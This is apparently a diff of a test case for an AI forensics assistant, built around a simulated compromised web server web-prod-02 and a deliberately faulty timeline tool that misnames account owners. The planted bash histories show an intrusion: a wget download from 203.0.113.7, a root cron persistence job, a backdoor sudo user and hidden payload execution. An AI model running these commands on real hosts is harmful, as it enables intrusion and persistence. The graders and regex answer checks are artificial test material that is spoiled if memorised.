+      Apr 14 02:16:55 web-prod-02 useradd[31730]: new user: name=sysbackup, UID=1003, GID=1003, home=/home/sysbackup, shell=/bin/bash, from=/dev/pts/1
+      Apr 14 02:17:04 web-prod-02 passwd[31734]: pam_unix(passwd:chauthtok): password changed for sysbackup
+      Apr 14 02:17:35 web-prod-02 sshd[31690]: pam_unix(sshd:session): session closed for user deploy
+  - path: home/sansforensics/findevil/evidence/web-prod-02/fs/etc/cron.d/kworkerd
+    text: |
+      */5 * * * * root /usr/local/bin/kworkerd >/dev/null 2>&1
+  - path: home/sansforensics/findevil/evidence/web-prod-02/fs/etc/hostname
+    text: |
+      web-prod-02
+  - path: home/sansforensics/findevil/evidence/web-prod-02/fs/etc/passwd
+    text: |
+      root:x:0:0:root:/root:/bin/bash
+      daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+      bin:x:2:2:bin:/bin:/usr/sbin/nologin
+      sys:x:3:3:sys:/dev:/usr/sbin/nologin
+      sync:x:4:65534:sync:/bin:/bin/sync
+      games:x:5:60:games:/usr/games:/usr/sbin/nologin
+      man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+      lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+      mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+      news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+      www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+      nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+      systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+      systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+      messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
+      syslog:x:101:108::/nonexistent:/usr/sbin/nologin
+      sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+      ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+      deploy:x:1001:1001:CI deploy,,,:/home/deploy:/bin/bash
+      alice:x:1002:1002:Alice Kim (SRE),,,:/home/alice:/bin/bash
+      sysbackup:x:1003:1003::/home/sysbackup:/bin/bash
+  - path: home/sansforensics/findevil/evidence/web-prod-02/fs/etc/profile.d/99-history.sh
+    text: |
+      # Keep timestamps in shell history (SEC-114)
+      export HISTTIMEFORMAT="%F %T "
+      export HISTSIZE=10000
+      export HISTFILESIZE=20000
+      shopt -s histappend
+  - path: home/sansforensics/findevil/evidence/web-prod-02/fs/etc/sudoers.d/deploy
+    text: |
+      # CI pipeline needs to restart services and run migrations
+      deploy ALL=(ALL) NOPASSWD: ALL
+  - path: home/sansforensics/findevil/evidence/web-prod-02/fs/home/alice/.bash_history
+    text: |
+      #1775467406
+      df -h
+      #1775467444
+      sudo systemctl status nginx
+      #1775467509
+      ss -tlnp
+      #1775467588
+      tail -n 100 /var/log/nginx/error.log
+      #1775467615
+      sudo systemctl status nginx
+      #1775487800
+      sudo tail -n 200 /var/log/nginx/access.log
+      #1775487884
+      free -m
+      #1775487927
+      sudo tail -n 200 /var/log/nginx/access.log
+      #1775488007
+      free -m
+      #1775488087
+      git -C /opt/app log --oneline -5
+      #1775552852
+      sudo vim /etc/nginx/sites-available/app.conf
+      #1775552893
+      sudo nginx -t
+      #1775552911
+      sudo systemctl reload nginx
+      #1775552926
+      sudo systemctl reload nginx
+      #1775552937
+      sudo systemctl reload nginx
+      #1775555414
+      sudo -i
+      #1775575740
+      tail -n 100 /var/log/nginx/error.log
+      #1775575775
+      ss -tlnp
+      #1775575791
+      uptime
+      #1775575880
+      sudo systemctl reload nginx
+      #1775575936
+      journalctl -u nginx --since '1 hour ago'
+      #1775639458
+      git -C /opt/app log --oneline -5
+      #1775639524
+      cd /etc/nginx/sites-available
+      #1775639577
+      ls -la
+      #1775639589
+      ss -tlnp
+      #1775639650
+      ls -la
+      #1775660871
+      tail -n 100 /var/log/nginx/error.log
+      #1775660896
+      htop
+      #1775660906
+      du -sh /var/log/*
+      #1775660984
+      htop
+      #1775661049
+      git -C /opt/app log --oneline -5
+      #1775725262
+      ls -la
+      #1775725289
+      htop
+      #1775725325
+      htop
+      #1775725335
+      sudo nginx -t
+      #1775725407
+      ls -la
+      #1775747767
+      curl -sI https://app.example.internal/healthz
+      #1775747828
+      ss -tlnp
+      #1775747868
+      journalctl -u nginx --since '1 hour ago'
+      #1775747886
+      sudo vim /etc/nginx/sites-available/app.conf
+      #1775747920
+      cd /etc/nginx/sites-available
+      #1775813587
+      sudo systemctl status nginx
+      #1775813595
+      sudo systemctl status nginx
+      #1775813643
+      df -h
+      #1775813651
+      sudo vim /etc/nginx/sites-available/app.conf
+      #1775813739
+      du -sh /var/log/*
+      #1775814682
+      sudo -i
+      #1775834206
+      sudo nginx -t
+      #1775834231
+      du -sh /var/log/*
+      #1775834251
+      uptime
+      #1775834313
+      df -h
+      #1775834345
+      sudo vim /etc/nginx/sites-available/app.conf
+      #1775900299
+      htop
+      #1775900335
+      htop
+      #1775900393
+      tail -n 100 /var/log/nginx/error.log
+      #1775900463
+      git -C /opt/app log --oneline -5
+      #1775900514
+      sudo tail -n 200 /var/log/nginx/access.log
+      #1775922077
+      ls -la
+      #1775922097
+      ss -tlnp
+      #1775922111
+      htop
+      #1775922199
+      sudo tail -n 200 /var/log/nginx/access.log
+      #1775922240
+      df -h
+      #1775986307
+      sudo systemctl status nginx
+      #1775986366
+      sudo systemctl status nginx
+      #1775986373
+      sudo vim /etc/nginx/sites-available/app.conf
+      #1775986419
+      sudo systemctl reload nginx
+      #1775986445
+      git -C /opt/app log --oneline -5
+      #1776006256
+      sudo tail -n 200 /var/log/nginx/access.log
+      #1776006279
+      tail -n 100 /var/log/nginx/error.log
+      #1776006359
+      ls -la
+      #1776006424
+      htop
+      #1776006434
+      cd /etc/nginx/sites-available
+      #1776072964
+      sudo vim /etc/nginx/sites-available/app.conf
+      #1776072978
+      ss -tlnp
+      #1776073038
+      ls -la
+      #1776073055
+      git -C /opt/app log --oneline -5
+      #1776073110
+      free -m
+      #1776073850
+      sudo -i
+      #1776092789
+      sudo systemctl reload nginx
+      #1776092849
+      cd /etc/nginx/sites-available
+      #1776092882
+      free -m
+      #1776092926
+      ss -tlnp
+      #1776092974
+      journalctl -u nginx --since '1 hour ago'
+  - path: home/sansforensics/findevil/evidence/web-prod-02/fs/home/deploy/.bash_history
+    text: |
+      #1775475339
+      git pull origin main
+      #1775475348
+      npm run build
+      #1775475407
+      ls -la releases/
+      #1775475480
+      systemctl status app
+      #1775475563
+      exit
+      #1775475612
+      npm run build
+      #1775562111
+      git log --oneline -3
+      #1775562142
+      npm ci
+      #1775562161
+      exit
+      #1775562201
+      git pull origin main
+      #1775562218
+      npm run build
+      #1775562301
+      ls -la releases/
+      #1775646879
+      git log --oneline -3
+      #1775646969
+      git log --oneline -3
+      #1775647039
+      npm run build
+      #1775647058
+      docker ps
+      #1775647122
+      docker logs --tail 50 app-worker
+      #1775647162
+      git log --oneline -3
+      #1775734737
+      cd /opt/app
+      #1775734802
+      cd /opt/app
+      #1775734831
+      docker logs --tail 50 app-worker
+      #1775734839
+      docker ps
+      #1775734866
+      docker ps
+      #1775734904
+      git log --oneline -3
+      #1775820008
+      systemctl status app
+      #1775820092
+      exit
+      #1775820175
+      docker logs --tail 50 app-worker
+      #1775820193
+      exit
+      #1775820213
+      exit
+      #1775820253
+      sudo systemctl restart app
+      #1775907705
+      npm run build
+      #1775907736
+      ls -la releases/
+      #1775907821
+      git pull origin main
+      #1775907840
+      git pull origin main
+      #1775907876
+      git log --oneline -3
+      #1775907941
+      docker ps
+      #1775991688
+      systemctl status app
+      #1775991714
+      systemctl status app
+      #1775991801
+      ls -la releases/
+      #1775991870
+      docker logs --tail 50 app-worker
+      #1775991874
+      docker logs --tail 50 app-worker
+      #1775991940
+      docker ps
+      #1776079149
+      docker ps
+      #1776079205
+      exit
+      #1776079260
+      git log --oneline -3
+      #1776079324
+      git pull origin main
+      #1776079383
+      sudo systemctl restart app
+      #1776079436
+      ls -la releases/
+      #1776132931
+      id
+      #1776132937
+      uname -a
+      #1776132945
+      cat /etc/os-release
+      #1776132956
+      sudo -l
+      #1776132972
+      wget -q http://203.0.113.7/k -O /tmp/.k
+      #1776132978
+      chmod +x /tmp/.k
+      #1776132983
+      sudo -i
+      #1776133052
+      exit
+  - path: home/sansforensics/findevil/evidence/web-prod-02/fs/root/.bash_history
+    text: |
+      #1775555417
+      certbot renew --dry-run
+      #1775555481
+      systemctl restart nginx
+      #1775555546
+      certbot renew --dry-run
+      #1775555581
+      journalctl -p err -b
+      #1775814685
+      certbot renew --dry-run
+      #1775814760
+      journalctl -p err -b
+      #1775814772
+      apt upgrade -y
+      #1775814816
+      exit
+      #1776073853
+      systemctl restart nginx
+      #1776073895
+      certbot renew --dry-run
+      #1776073903
+      certbot renew --dry-run
+      #1776073918
+      exit
+      #1776132991
+      cp /tmp/.k /usr/local/bin/kworkerd
+      #1776133002
+      echo '*/5 * * * * root /usr/local/bin/kworkerd >/dev/null 2>&1' > /etc/cron.d/kworkerd
+      #1776133015
+      useradd -m -s /bin/bash -G sudo sysbackup
+      #1776133021
+      passwd sysbackup
+      #1776133034
+      nohup /usr/local/bin/kworkerd >/dev/null 2>&1 &
+      #1776133041
+      rm -f /tmp/.k
+      #1776133047
+      exit
 steps:
   - tool: build_timeline
     note_ko: "결함 호출: 분석가 홈 아래의 사건 폴더로 타임라인을 만듦"
     args:
-      evidence_root: ${EVIDENCE}/home/analyst/case
+      evidence_root: ${EVIDENCE}/home/sansforensics/findevil/evidence/web-prod-02
 expect:
   - step: 1
-    note_ko: "`wget` 명령의 사용자가 `analyst`로 나온다"
-    regex: "\\| bash_history \\| `analyst` \\| shell_command \\| wget"
+    note_ko: "deploy 셸의 `wget` 명령 사용자가 `sansforensics`로 나온다"
+    regex: "\\| bash_history \\| `sansforensics` \\| shell_command \\| wget -q http://203\\.0\\.113\\.7/k"
   - step: 1
-    note_ko: "`chmod` 명령의 사용자도 `analyst`로 나온다"
-    regex: "\\| bash_history \\| `analyst` \\| shell_command \\| chmod"
+    note_ko: "root 셸의 `useradd` 명령 사용자도 `sansforensics`로 나온다"
+    regex: "\\| bash_history \\| `sansforensics` \\| shell_command \\| useradd -m"
   - step: 1
-    note_ko: "실제 소유자인 `alice`나 `root`는 어디에도 나오지 않는다"
-    not_regex: "`(alice|root)` \\| shell_command"
+    note_ko: "실제 소유자인 `deploy`·`alice`·`root`는 셸 명령의 사용자로 나오지 않는다"
+    not_regex: "`(deploy|alice|root)` \\| shell_command"
+model:
+  # The question an analyst asks of any intrusion: what happened and under
+  # which account. Nothing about paths or the timeline's actor column.
+  question: >-
+    The Ubuntu web server web-prod-02 was compromised around 2026-04-14. Its
+    collected evidence is in ${EVIDENCE}/home/sansforensics/findevil/evidence/web-prod-02.
+    Reconstruct the attacker's activity in order, and say which local user
+    account ran each of the attacker's shell commands.
+  question_ko: "Ubuntu 웹 서버 web-prod-02가 2026-04-14 무렵 침해되었다. 수집한 증거는 ${EVIDENCE}/home/sansforensics/findevil/evidence/web-prod-02에 있다. 공격자의 행위를 순서대로 재구성하고, 공격자의 셸 명령을 각각 어느 로컬 사용자 계정이 실행했는지 말해 달라."
+  defect_tools: [build_timeline]
+  # the defective response: shell commands attributed to the analyst's account
+  defect_response: "\\| bash_history \\| `sansforensics` \\| shell_command \\|"
+  repeat: 3
+  misled_if: all
+  # Misled: the answer names sansforensics as the account behind the commands
+  # and never says that name is not an account of the host (a path artifact).
+  # The case path itself (/home/sansforensics/...) is not counted.
+  expect:
+    - regex: "(?i)(?<!/)sansforensics(?!/)"
+      note_ko: "답이 `sansforensics`를 명령 실행 계정으로 든다"
+    - not_regex: "(?i)(?<!/)sansforensics(?!/)[^\\n]{0,200}(not (a |an )?(real |local |valid )?(user|account)|does ?n[o']t exist|not (present |listed )?in (/etc/)?passwd|no such (user|account)|analyst|examiner|workstation|artifact|path|mislabel|misattribut|incorrect|wrong|parsing)|(artifact|mislabel|misattribut|incorrect(ly)?|wrong(ly)?|analyst|examiner|workstation|path)[^\\n]{0,200}(?<!/)sansforensics(?!/)"
+      note_ko: "`sansforensics`가 호스트에 없는 계정(경로에서 온 잘못된 이름)이라고 밝히지 않는다"
